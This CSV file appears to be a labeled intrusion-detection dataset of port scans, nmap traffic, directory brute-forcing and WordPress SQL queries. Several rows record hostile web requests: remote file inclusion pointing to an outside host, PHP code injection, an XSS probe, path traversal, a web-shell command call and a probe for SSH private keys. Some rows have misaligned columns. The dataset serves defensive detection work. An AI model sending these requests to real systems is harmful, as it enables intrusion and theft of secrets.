@timestamp,src_ip,src_port,dst_ip,dst_port,Protocol,http_request_method,http_request_referrer,http_response_code,url_path,user_agent_original,sql_method,sql_query,category,label_
1666692056,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666690179,192.168.34.11,53232,192.168.33.12,0,HTTP,0,0,0,/utils/sprc.asp+,0,0,0,web_enumeration,2
1666542079,0,61900,192.168.106.130,53,0,0,0,0,0,0,0,0,port_scan,3
1666582468,192.168.207.142,0,0,0,HTTPS,GET,0,404,/_mem_bin/auoconfig.asp,Mozilla/5.00,0,0,web_enumeration,1
1666580395,192.168.207.142,0,0,0,HTTPS,GET,0,404,/cfide/Administrator/startstop.html,Mozilla/5.00,0,0,web_enumeration,1
1666541343,0,53326,127.0.0.1,1120,0,0,0,0,0,0,0,0,port_scan,3
1666582465,192.168.207.142,0,0,0,HTTPS,GET,0,404,/w3c,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666582464,192.168.207.142,0,0,0,HTTPS,GET,0,404,/databases.php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666712777, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666692064,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1666582483,192.168.207.142,0,0,0,HTTPS,GET,0,404,/web/BetaBlockModules/GroupModerateUserModule/GroupModerateUserModule.php?path_prefix=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666582464,192.168.207.142,0,0,0,HTTPS,GET,0,404,/sun,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666691973,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/dratfs.php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666692145,10.32.4.176,43526,10.132.100.52,80,TCP,0,0,0,0,0,0,0,port_scan,0
1666542072,192.168.106.1,53311,192.168.106.130,53,2022-10-24 00:20:41 ALLOW UDP 192.168.106.1 192.168.106.130 53311 53 0 - - - - - - - SEND 25804,UDP,0,0,0,0,0,0,port_scan,2
1666582464,192.168.207.142,0,0,0,HTTPS,GET,0,404,/music,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666692077,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666691973,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/svc.php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666542072,192.168.106.1,51023,192.168.106.130,53,2022-10-24 00:20:38 ALLOW UDP 192.168.106.1 192.168.106.130 51023 53 0 - - - - - - - SEND 25804,UDP,0,0,0,0,0,0,port_scan,2
1666582485,192.168.207.142,0,0,0,HTTPS,GET,0,404,/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=GetFolders&Type=File&CurrentFolder=%2F,Mozilla/5.00,0,0,web_enumeration,1
1666692057,10.32.4.176,33180,10.132.100.52,3325,TCP,0,0,0,0,0,0,0,port_scan,0
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666582464,192.168.207.142,0,0,0,HTTPS,GET,0,404,/debug.php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666542719,192.168.1.225,54850,40.90.184.73,443,TCP,0,0,0,0,0,0,0,port_scan,1
1666691985,10.32.4.176,45388,10.132.100.53,2605,TCP,0,0,0,0,0,0,0,port_scan,0
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666692038,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1666591917,10.0.0.20,34332,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT option_value FROM wp_options WHERE option_name = 'widget_recent-comments' LIMIT 1,sql_enumeration,0
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/poll.php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666692146,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666691985,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666591847,10.0.0.22,0,10.0.0.20,0,0,0,0,0,0,0,0,0,sql_enumeration,0
1666692055,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666580407,192.168.207.142,0,0,0,HTTPS,GET,0,404,/Script/fckeditor/editor/filemanager/connectors/perl/connector.cgi?Command=GetFolders&Type=File&CurrentFolder=%2F,Mozilla/5.00,0,0,web_enumeration,1
1666542079,192.168.106.1,53874,192.168.106.130,53,2022-10-24 00:20:52 ALLOW UDP 192.168.106.1 192.168.106.130 53874 53 0 - - - - - - - SEND 25804,UDP,0,0,0,0,0,0,port_scan,2
1666692098,10.132.101.52,49834,10.132.101.101,143,TCP,0,0,0,0,0,0,0,port_scan,0
1666691930,100.64.19.103,59610,100.64.19.22,11967,TCP,0,0,0,0,0,0,0,port_scan,3
1664374193,192.168.91.128,50910,192.168.91.1,139,TCP,0,0,0,0,0,0,0,port_scan,2
1666631540,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666712777, 192.168.10.2,9200,48424,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666580395,192.168.207.142,0,0,0,HTTPS,GET,0,404,/login.jsp,Mozilla/5.00,0,0,web_enumeration,1
1666691982,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666580394,192.168.207.142,0,0,0,HTTPS,GET,0,404,/help.html,Mozilla/5.00,0,0,web_enumeration,1
1666591159,0,0,10.0.0.21,3306,0,0,0,0,0,0,0,0,sql_enumeration,0
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1664429610,192.168.91.128,33482,192.168.91.1,1,udp,0,0,0,0,0,0,0,port_scan,2
1666705133, 192.168.10.2,9200,47642,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666691984,10.32.4.176,56258,10.132.100.53,12174,TCP,0,0,0,0,0,0,0,port_scan,0
1666690179,192.168.34.11,53116,0,0,HTTP,0,0,0,0,0,0,0,web_enumeration,1
1666590647,10.0.0.20,33254,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT option_value FROM wp_options WHERE option_name = 'can_compress_scripts' LIMIT 1,sql_enumeration,0
1666692146,10.32.4.176,43526,10.132.100.52,80,TCP,0,0,0,0,0,0,0,port_scan,0
1666700226, 192.168.10.2,9200,47640,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666591280,0,0,10.0.0.20,80,0,0,0,0,0,0,0,0,sql_enumeration,0
1666692065,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666690178,192.168.34.11,53110,192.168.33.12,0,HTTP,0,0,0,/weblogs/,0,0,0,web_enumeration,2
1666692145,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666580393,192.168.207.142,0,0,0,HTTPS,GET,0,404,/192.168.pem,Mozilla/5.00,0,0,web_enumeration,1
1666591707,10.0.0.20,34154,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT FOUND_ROWS(),sql_enumeration,0
1666691930,100.64.19.103,47160,100.64.19.22,15742,TCP,0,0,0,0,0,0,0,port_scan,3
1666582486,192.168.207.142,0,0,0,HTTPS,GET,0,404,/phpmoadmin/moadmin.php?collection=secpulse&action=listRows&find=array();phpinfo();exit;,Mozilla/5.00,0,0,web_enumeration,1
1666692056,10.32.4.176,37482,10.132.100.52,2041,TCP,0,0,0,0,0,0,0,port_scan,0
1666691985,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1664375119,192.168.91.15,50432,239.255.255.250,1900,UDP,0,0,0,0,0,0,0,port_scan,2
1666692057,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1664428800,192.168.91.128,47142,192.168.91.1,96,tcp,0,0,0,0,0,0,0,port_scan,2
1666692058,10.32.4.176,39344,10.132.100.52,6580,TCP,0,0,0,0,0,0,0,port_scan,0
1666580399,192.168.207.142,0,0,0,HTTPS,GET,0,404,/plugins/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp,Mozilla/5.00,0,0,web_enumeration,1
1666541603,0,60047,74.125.130.95,443,0,0,0,0,0,0,0,0,port_scan,0
1666582481,192.168.207.142,0,0,0,HTTPS,GET,0,404,/phpress/adisplay.php?lang=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666690178,192.168.34.11,53112,192.168.33.12,0,HTTP,0,0,0,/vc30/,0,0,0,web_enumeration,2
1666630671,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666691984,10.32.4.176,43992,10.132.100.53,1107,TCP,0,0,0,0,0,0,0,port_scan,0
1666591137,10.0.0.20,33670,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,"SELECT DISTINCT t.term_id, tr.object_id
			FROM wp_terms AS t  INNER JOIN wp_term_taxonomy AS tt ON t.term_id = tt.term_id INNER JOIN wp_term_relationships AS tr ON tr.term_taxonomy_id = tt.term_taxonomy_id
			WHERE tt.taxonomy IN ('category', 'post_tag', 'post_format') AND tr.object_id IN (1)
			ORDER BY t.name ASC",sql_enumeration,0
1666582468,192.168.207.142,0,0,0,HTTPS,GET,0,404,/password.inc,Mozilla/5.00,0,0,web_enumeration,1
1666580399,192.168.207.142,0,0,0,HTTPS,GET,0,404,/sites/all/libraries/fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp,Mozilla/5.00,0,0,web_enumeration,1
1666691974,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666582465,192.168.207.142,0,0,0,HTTPS,GET,0,404,/LvAjqjtV.inc,Mozilla/5.00,0,0,web_enumeration,1
1666582481,192.168.207.142,0,0,0,HTTPS,GET,0,404,/naboard_pnr.php?skin=http://cirt.net/rfiinc.txt??,Mozilla/5.00,0,0,web_enumeration,1
1664487693,192.168.91.128,0,0,0,0,GET,http://localhost/,404,/js/bootstrap.min.js,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",0,0,web_enumeration,1
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666692058,10.32.4.176,51402,10.132.100.52,2399,TCP,0,0,0,0,0,0,0,port_scan,0
1666590587,10.0.0.22,0,10.0.0.20,0,0,0,0,0,0,0,0,0,sql_enumeration,0
1666591997,10.0.0.20,34398,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,"SELECT SQL_CALC_FOUND_ROWS  wp_posts.ID
					FROM wp_posts 
					WHERE 1=1  AND ((wp_posts.post_type = 'post' AND (wp_posts.post_status = 'publish')))
					
					ORDER BY wp_posts.post_date DESC
					LIMIT 0, 10",sql_enumeration,0
1666691974,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666541551,0,58402,54.192.150.32,443,0,0,0,0,0,0,0,0,port_scan,0
1666630783,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666630769,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666573819,192.168.0.102,0,172.18.0.1,0,HTTPS,OPTIONS,0,200,/,Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html),0,0,web_enumeration,2
1666695810, 192.168.10.2,9200,47634,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666580401,192.168.207.142,0,0,0,HTTPS,GET,0,404,/classes/query.class.php?baseDir=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666590927,10.0.0.22,0,10.0.0.20,0,0,0,0,0,0,0,0,0,sql_enumeration,0
1666691972,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666690179,192.168.34.11,53138,0,0,HTTP,0,0,0,0,0,0,0,web_enumeration,1
1666580402,192.168.207.142,0,0,0,HTTPS,GET,0,404,/flushcmd/Include/editor/rich_files/class.rich.php?class_path=http://cirt.net/rfiinc.txt??,Mozilla/5.00,0,0,web_enumeration,1
1664429470,142.251.10.94,80,192.168.91.128,46096,udp,0,0,0,0,0,0,0,port_scan,2
1666590819,0,0,192.168.106.130,8001,0,0,0,0,0,0,0,0,sql_enumeration,3
1666691952,100.64.19.22,8443,100.64.19.103,43408,TCP,0,0,0,0,0,0,0,port_scan,3
1666690179,192.168.34.11,53232,0,0,HTTP,0,0,0,0,0,0,0,web_enumeration,1
1666631452,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1664428800,192.168.91.128,41512,192.168.91.1,132,tcp,0,0,0,0,0,0,0,port_scan,2
1666692109,10.132.100.50,0,10.132.100.52,0,UDP,0,0,0,0,0,0,0,port_scan,0
1666691932,100.64.19.103,59612,100.64.19.22,417,TCP,0,0,0,0,0,0,0,port_scan,3
1666582469,192.168.207.142,0,0,0,HTTPS,GET,0,404,/servlet/org.apache.catalina.ContainerServlet/<script>alert('Vulnerable')</script>,Mozilla/5.00,0,0,web_enumeration,1
1666580397,192.168.207.142,0,0,0,HTTPS,GET,0,404,/forum.asp?n=../../boot.ini|41|80040e14|[Microsoft][ODBC_SQL_Server_Driver][SQL_Server]Line_1:_Incorrect_syntax_near_&#039;/&#039;.,Mozilla/5.00,0,0,web_enumeration,1
1664375118,192.168.91.15,50432,239.255.255.250,1900,UDP,0,0,0,0,0,0,0,port_scan,2
1666582464,192.168.207.142,0,0,0,HTTPS,GET,0,404,/page.php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666590827,10.0.0.20,33404,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT option_value FROM wp_options WHERE option_name = 'widget_recent_entries' LIMIT 1,sql_enumeration,0
1666691972,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666580391,192.168.207.142,0,0,0,HTTPS,GET,0,404,/soap,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666692118,10.132.100.52,22,10.32.4.176,40080,TCP,0,0,0,0,0,0,0,port_scan,0
1666691993,10.32.4.176,57618,10.132.100.53,22,TCP,0,0,0,0,0,0,0,port_scan,0
1666691985,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666691984,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666692078,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666722173, 127.0.0.1 ,0,172.24.2.100,0,HTTP,OPTIONS,0,200,*,Apache/2.4.18 (Ubuntu) (internal dummy connection),0,0,web_enumeration,3
1666590697,10.0.0.20,33294,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,"SELECT SQL_CALC_FOUND_ROWS  wp_posts.ID
					FROM wp_posts 
					WHERE 1=1  AND ((wp_posts.post_type = 'post' AND (wp_posts.post_status = 'publish')))
					
					ORDER BY wp_posts.post_date DESC
					LIMIT 0, 10",sql_enumeration,0
1666691983,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666580404,192.168.207.142,0,0,0,HTTPS,GET,0,404,/phpbb/sendmsg.php?phpbb_root_path=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666541343,0,53343,127.0.0.1,1120,0,0,0,0,0,0,0,0,port_scan,3
1666700355, 192.168.10.2,9200,47640,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666690178,192.168.34.11,53112,192.168.33.12,0,HTTP,0,0,0,/cgi0bin/pass,0,0,0,web_enumeration,2
1666580396,192.168.207.142,0,0,0,HTTPS,GET,0,404,/ows-bin/perlidlc.bat?&dir,Mozilla/5.00,0,0,web_enumeration,1
1666691985,10.32.4.176,59354,10.132.100.53,4567,TCP,0,0,0,0,0,0,0,port_scan,0
1666542071,192.168.106.1,51016,192.168.106.130,53,2022-10-24 00:20:37 ALLOW UDP 192.168.106.1 192.168.106.130 51016 53 0 - - - - - - - SEND 25804,UDP,0,0,0,0,0,0,port_scan,2
1666712777, 192.168.10.2,9200,48406,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666580407,192.168.207.142,0,0,0,HTTPS,GET,0,404,/wordpresswp-content/plugins/gravityforms/change_log.txt,Mozilla/5.00,0,0,web_enumeration,1
1666590717,10.0.0.20,33312,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT option_value FROM wp_options WHERE option_name = 'WPLANG' LIMIT 1,sql_enumeration,0
1666580390,192.168.207.142,0,0,0,HTTPS,GET,0,404,/cc.php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666582480,192.168.207.142,0,0,0,HTTPS,GET,0,200,/index.php?styl[top]=http://cirt.net/rfiinc.txt???,Mozilla/5.00,0,0,web_enumeration,1
1666591520,0,0,192.168.106.130,8001,0,0,0,0,0,0,0,0,sql_enumeration,3
1666580394,192.168.207.142,0,0,0,HTTPS,GET,0,404,/contents.php?new_language=elvish&mode=select,Mozilla/5.00,0,0,web_enumeration,1
1666694828, 192.168.10.2,9200,47634,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666692078,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666691973,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666631265,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666692043,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1666691932,100.64.19.103,37740,100.64.19.22,545,TCP,0,0,0,0,0,0,0,port_scan,3
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666580419,192.168.207.142,0,0,0,HTTPS,GET,0,499,/uploads/shell.php?cmd=id,curl/7.84.0,0,0,web_enumeration,1
1666703850, 192.168.10.2,9200,47642,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666691972,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666541373,0,53429,127.0.0.1,1120,0,0,0,0,0,0,0,0,port_scan,3
1666692064,10.32.4.176,46380,10.132.100.52,80,TCP,0,0,0,0,0,0,0,port_scan,0
1666692077,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666582479,192.168.207.142,0,0,0,HTTPS,GET,0,404,/functions/groups.func.php?GLOBALS[PTH][classes]=http://cirt.net/rfiinc.txt??,Mozilla/5.00,0,0,web_enumeration,1
1666582464,192.168.207.142,0,0,0,HTTPS,GET,0,404,/account.php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666591947,10.0.0.20,34356,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT option_value FROM wp_options WHERE option_name = 'large_crop' LIMIT 1,sql_enumeration,0
1666591199,0,0,10.0.0.22,5044,0,0,0,0,0,0,0,0,sql_enumeration,0
1666691984,10.32.4.176,33820,10.132.100.53,15660,TCP,0,0,0,0,0,0,0,port_scan,0
1664429480,34.208.34.131,443,192.168.91.128,39532,tcp,0,0,0,0,0,0,0,port_scan,3
1666541656,192.168.1.225,60912,162.159.134.232,443,2022-10-24 00:13:47 ALLOW TCP 192.168.1.225 162.159.134.232 60912 443 0 - 0 0 0 - - - SEND 20088,TCP,0,0,0,0,0,0,port_scan,2
1666582464,192.168.207.142,0,0,0,HTTPS,GET,0,404,/groups.php,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666590607,10.0.0.20,33220,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,"SELECT DISTINCT t.term_id, tr.object_id
			FROM wp_terms AS t  INNER JOIN wp_term_taxonomy AS tt ON t.term_id = tt.term_id INNER JOIN wp_term_relationships AS tr ON tr.term_taxonomy_id = tt.term_taxonomy_id
			WHERE tt.taxonomy IN ('category', 'post_tag', 'post_format') AND tr.object_id IN (1)
			ORDER BY t.name ASC",sql_enumeration,0
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666712777, 192.168.10.2,9200,48406,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666541336,127.0.0.1,53208,127.0.0.1,1120,2022-10-24 00:08:31 ALLOW TCP 127.0.0.1 127.0.0.1 53208 1120 0 - 0 0 0 - - - SEND 6624,TCP,0,0,0,0,0,0,port_scan,3
1666580401,192.168.207.142,0,0,0,HTTPS,GET,0,404,/administrator/components/com_wmtportfolio/admin.wmtportfolio.php?mosConfig_absolute_path=http://cirt.net/rfiinc.txt?,Mozilla/5.00,0,0,web_enumeration,1
1666697246, 192.168.10.2,9200,47636,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666591717,10.0.0.20,34162,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT option_value FROM wp_options WHERE option_name = 'medium_large_crop' LIMIT 1,sql_enumeration,0
1666591847,10.0.0.20,34274,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,"SELECT   wp_posts.ID
					FROM wp_posts 
					WHERE 1=1  AND ( 
  0 = 1
) AND wp_posts.post_type = 'wp_global_styles' AND ((wp_posts.post_status = 'publish'))
					GROUP BY wp_posts.ID
					ORDER BY wp_posts.post_date DESC
					LIMIT 0, 1",sql_enumeration,0
1666692146,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1666591997,10.0.0.20,34398,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT option_value FROM wp_options WHERE option_name = 'widget_recent-posts' LIMIT 1,sql_enumeration,0
1666542719,192.168.106.1,65072,239.255.255.250,1900,UDP,0,0,0,0,0,0,0,port_scan,2
1666582468,192.168.207.142,0,0,0,HTTPS,GET,0,404,/exchange/lib/LANG.INC,Mozilla/5.00,0,0,web_enumeration,1
1666691985,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666691931,100.64.19.103,36986,100.64.19.22,593,TCP,0,0,0,0,0,0,0,port_scan,3
1666582464,192.168.207.142,0,0,0,HTTPS,GET,0,404,/change,gobuster/3.2.0-dev,0,0,web_enumeration,1
1664429530,142.251.10.94,80,192.168.91.128,46096,tcp,0,0,0,0,0,0,0,port_scan,2
1666591420,0,0,192.168.106.130,8001,0,0,0,0,0,0,0,0,sql_enumeration,3
1666582464,192.168.207.142,0,0,0,HTTPS,GET,0,404,/admin_,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666541913,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666692057,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666590627,10.0.0.20,33236,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,SELECT option_value FROM wp_options WHERE option_name = 'can_compress_scripts' LIMIT 1,sql_enumeration,0
1666712776, 10.0.0.3,4444,45530,192.168.10.2,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666691984,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666582473,192.168.207.142,0,0,0,HTTPS,GET,0,404,/exchange/,Mozilla/5.00,0,0,web_enumeration,1
1666692146,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666630300,192.168.106.130,0,192.168.236.1,0,ICMP,0,0,0,0,0,0,0,port_scan,2
1666582464,192.168.207.142,0,0,0,HTTPS,GET,0,404,/frame,gobuster/3.2.0-dev,0,0,web_enumeration,1
1666582487,192.168.207.142,0,0,0,HTTPS,GET,0,404,/.ssh/id_ecdsa,Mozilla/5.00,0,0,web_enumeration,1
1666692145,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666692146,10.32.4.176,43526,10.132.100.52,80,TCP,0,0,0,0,0,0,0,port_scan,0
1666692124,1.1.1.1,0,10.132.100.50,0,UDP,0,0,0,0,0,0,0,port_scan,0
1666542079,0,53963,192.168.106.130,53,0,0,0,0,0,0,0,0,port_scan,3
1666580408,192.168.207.142,0,0,0,HTTPS,GET,0,404,/DesktopModules/Admin/RadEditorProvider/DialogHandler.aspx?dp=////,Mozilla/5.00,0,0,web_enumeration,1
1666692056,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666542578,192.168.1.225,62450,74.125.200.94,443,UDP,0,0,0,0,0,0,0,port_scan,1
1666692095,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1666692077,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666692056,100.64.19.22,8443,100.64.19.103,44618,TCP,0,0,0,0,0,0,0,port_scan,3
1666691975,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666591927,10.0.0.20,34340,10.0.0.21,3306,mysql,0,0,0,0,0,SELECT,"SELECT t.*, tt.* FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id = tt.term_id WHERE t.term_id IN (1)",sql_enumeration,0
1666692128,10.132.101.101,22,10.132.101.52,34158,TCP,0,0,0,0,0,0,0,port_scan,0
1666541388,0,55039,13.248.193.101,8181,0,0,0,0,0,0,0,0,port_scan,0
1666692077,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666691975,100.64.19.103,44618,100.64.19.22,8443,TCP,0,0,0,0,0,0,0,port_scan,3
1666691985,10.32.4.176,57906,10.132.100.53,901,TCP,0,0,0,0,0,0,0,port_scan,0
1666690179,192.168.34.11,53232,192.168.33.12,0,HTTP,0,0,0,/cgi0bin/counter0ord,0,0,0,web_enumeration,2
1666541306,192.168.1.254,1900,239.255.255.250,1900,2022-10-24 00:08:03 DROP UDP 192.168.1.254 239.255.255.250 1900 1900 409 - - - - - - - RECEIVE 11164,UDP,0,0,0,0,0,0,port_scan,2
1666690179,192.168.34.11,53206,192.168.33.12,0,HTTP,0,0,0,/manage/login.asp+,0,0,0,web_enumeration,2
1666692057,10.32.4.176,33580,10.132.100.52,7937,TCP,0,0,0,0,0,0,0,port_scan,0
1666696009, 192.168.10.2,9200,47634,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666712776, 192.168.10.2,9200,48382,192.168.10.3,TCP/UDP,0,0,0,0,0,0,0,nmap_scan,4
1666541906,0,0,0,0,0,0,0,0,0,0,0,0,port_scan,0
1666541343,0,53287,127.0.0.1,1120,0,0,0,0,0,0,0,0,port_scan,3
1666582465,192.168.207.142,0,0,0,HTTPS,GET,0,404,/LvAjqjtV.txt,Mozilla/5.00,0,0,web_enumeration,1
1666582473,192.168.207.142,0,0,0,HTTPS,GET,0,404,/acartpath/signin.asp?|-|0|404_Object_Not_Found,Mozilla/5.00,0,0,web_enumeration,1
